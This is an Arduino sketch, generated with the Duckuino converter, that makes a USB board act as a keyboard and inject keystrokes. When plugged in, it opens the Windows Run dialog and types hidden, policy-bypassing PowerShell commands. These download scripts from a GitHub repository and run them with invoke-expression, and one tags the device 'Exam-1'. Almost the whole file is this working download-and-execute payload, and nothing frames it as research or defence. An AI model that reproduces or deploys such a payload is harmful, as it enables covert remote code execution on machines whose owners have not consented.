/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
 Keyboard.press(key);
 delay(50);
 Keyboard.release(key);
}

/* Init function */
void setup()
{
 Keyboard.begin(KeyboardLayout_es_ES);
 delay(1500);

 Keyboard.press(KEY_LEFT_GUI);
 Keyboard.press('r');
 Keyboard.releaseAll();

 delay(200);
 Keyboard.print(F("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/4ng3lp/trec-joan/main/trec-pl.ps1?dl=1; $env:USBNAME = 'Exam-1';invoke-expression $pl"));
 typeKey(KEY_RETURN);
 delay(1500);

 Keyboard.press(KEY_LEFT_GUI);
 Keyboard.press('r');
 Keyboard.releaseAll();
delay(200);

/*
 Keyboard.print(F("powershell"));
typeKey(KEY_RETURN);
 delay(200);
 Keyboard.print(F("$pl = iwr https://raw.githubusercontent.com/4ng3lp/trec-joan/main/trec-avis.ps1?dl=1; invoke-expression $pl"));

typeKey(KEY_RETURN);
 delay(200);

*/
 Keyboard.print(F("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/4ng3lp/trec-joan/main/trec-avis.ps1?dl=1; invoke-expression $pl"));
 typeKey(KEY_RETURN);
 delay(1500);

 Keyboard.end();
}

/* Unused endless loop */
void loop() {}
